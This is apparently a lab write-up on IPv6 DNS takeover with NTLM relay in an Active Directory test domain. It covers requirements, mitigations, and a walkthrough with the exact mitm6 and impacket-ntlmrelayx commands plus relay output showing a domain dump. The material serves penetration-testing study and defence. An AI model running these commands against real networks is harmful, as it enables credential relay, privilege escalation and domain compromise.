# IPv6 Attacks

### Intended Functionality

IPv6 is enabled by default on modern Windows systems, even in networks that primarily use IPv4. Windows will prefer IPv6 over IPv4 for name resolution and connectivity. When a system cannot resolve a hostname via DNS, it may fall back to LLMNR/NetBIOS over IPv6 and query for WPAD (Web Proxy Auto-Discovery) or DNS via multicast. This is intended to allow automatic configuration and connectivity in IPv6-enabled networks without requiring manual setup.

### What can go wrong here?

An attacker can exploit this by deploying a rogue IPv6 DNS server using tools like mitm6. Since Windows machines prioritize IPv6, they will accept DNS and WPAD responses from the attacker. This lets the attacker redirect victims’ authentication attempts (NTLM) to themselves, then relay those credentials to a service such as LDAP(S) on a Domain Controller.

### Attack Requirements

- IPv6 enabled on victim machines (default in Windows).

- No legitimate IPv6 infrastructure in the environment, otherwise, the rogue DNS/DHCP advertisements would conflict.

- NTLM authentication allowed (common in AD environments for legacy compatibility).

- LDAP/SMB signing not enforced, so that relayed credentials can be accepted.

- A user or machine account must attempt network authentication (e.g., via WPAD, logon, reboot, or resource access).

- Attacker has network access (plugged into internal LAN, Wi-Fi, or already on a compromised host).

### Attack walkthrough

1. Launch mitm6 on the attacker machine to impersonate an IPv6 DNS/DHCP server and advertise itself to the network:

```
sudo mitm6 -i eth0 -d marvel.local
```

2. Run impacket-ntlmrelayx to listen for NTLM authentication attempts and relay them to a target service, typically LDAP(S) on the Domain Controller

```
impacket-ntlmrelayx -6 -t ldap(s)://10.0.2.18 -wh fakewpad.marvel.local -l lootme
```

3. Trigger events to generate authentication traffic (rebooting a machine like THEPUNISHER or logging in as Administrator). This forces the victim to reach out for WPAD/DNS resolution, sending authentication requests to the attacker.

4. The attacker captures and relays the NTLM authentication to the DC, gaining access or privilege escalation depending on the relayed account’s rights.

```
[*] HTTPD(80): Connection from ::ffff:10.0.2.16 controlled, attacking target ldap://10.0.2.18
[*] HTTPD(80): Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] HTTPD(80): Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] HTTPD(80): Authenticating against ldap://10.0.2.18 as MARVEL/THEPUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD(80): Authenticating against ldap://10.0.2.18 as MARVEL/THEPUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] All targets processed!
```

```{figure} ../../../_static/AD/loot.png
:alt: Loot
:width: 100%
:align: center

Dumped Domain info

```

### Mitigation strategies

- Disable IPv6 if the environment does not require it.

- Enforce SMB and LDAP signing to prevent NTLM relay attacks.

- Disable WPAD (via Group Policy) to prevent automatic proxy discovery.

- Restrict high-privilege accounts from authenticating to untrusted systems, reducing the impact of relayed credentials.
